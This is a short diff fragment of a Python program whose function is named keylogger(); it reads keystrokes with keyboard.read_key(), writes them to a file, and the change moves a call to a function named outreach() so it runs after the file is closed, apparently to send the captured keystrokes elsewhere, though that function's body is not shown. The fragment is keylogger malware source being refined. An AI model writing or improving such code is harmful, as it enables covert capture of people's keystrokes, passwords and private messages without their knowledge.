@@ -38,8 +38,9 @@ def keylogger():
             char = keyboard.read_key()
 
             file.write(char)
-            outreach()
             file.close()
+            outreach()
+            
 
 if __name__ == '__main__':
 
